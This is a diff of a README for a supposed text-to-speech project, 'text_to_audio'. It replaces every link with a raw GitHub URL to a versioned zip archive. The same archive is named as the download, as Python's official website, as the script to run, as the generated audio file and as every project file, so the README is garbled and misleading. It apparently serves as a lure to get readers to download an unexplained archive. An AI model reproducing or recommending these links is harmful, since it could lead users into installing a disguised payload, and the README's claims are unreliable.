@@ -1,6 +1,6 @@
 # 🎙️ text_to_audio - Convert Text to Human-Like Speech Easily
 
-[![Download Now](https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip)](https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip)
+[![Download Now](https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip)](https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **text_to_audio**! This app transforms text into natural-sounding spe
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download text_to_audio](https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip). 
+To get started, visit this page to download: [Download text_to_audio](https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip). 
 
 Here you will find the latest version of the software. Select the link labeled as "Latest Release" to download.
 
@@ -17,7 +17,7 @@ Here you will find the latest version of the software. Select the link labeled a
 Before you begin, ensure you have the following:
 
 - A computer running Windows, macOS, or Linux.
-- Python installed on your machine. You can download Python from the official website: [https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip](https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip).
+- Python installed on your machine. You can download Python from the official website: [https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip](https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip).
 
 ## 📂 Setting Up
 
@@ -44,12 +44,12 @@ Follow these simple steps to convert text to speech:
 3. Run the program by typing:
 
    ```bash
-   python https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip
+   python https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip
    ```
 
 4. When prompted, enter the text you wish to convert to speech.
 
-5. The application will generate an audio file named `https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip`. This file will be played automatically for you to listen.
+5. The application will generate an audio file named `https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip`. This file will be played automatically for you to listen.
 
 ## 📜 Features
 
@@ -95,9 +95,9 @@ The following files are included in this project:
 
 ```
 Text-To-Voice/
- ├── https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip  # The main script to run
- ├── https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip  # Generated audio file 
- └── https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip  # Documentation for users
+ ├── https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip  # The main script to run
+ ├── https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip  # Generated audio file 
+ └── https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip  # Documentation for users
 ```
 
 ## 🔗 More Resources
@@ -110,4 +110,4 @@ If you have any questions or feedback, feel free to open an issue on the reposit
 
 ## 📍 Final Thoughts
 
-Thank you for using **text_to_audio**! We hope you enjoy converting your text into voice with this easy-to-use application. Don't forget to visit this page to download and stay updated: [Download text_to_audio](https://github.com/antonyiziaiir/text_to_audio/raw/refs/heads/main/Notebook/text-to-audio-v2.4.zip).
+Thank you for using **text_to_audio**! We hope you enjoy converting your text into voice with this easy-to-use application. Don't forget to visit this page to download and stay updated: [Download text_to_audio](https://raw.githubusercontent.com/antonyiziaiir/text_to_audio/main/Notebook/text-to-audio-v2.9.zip).
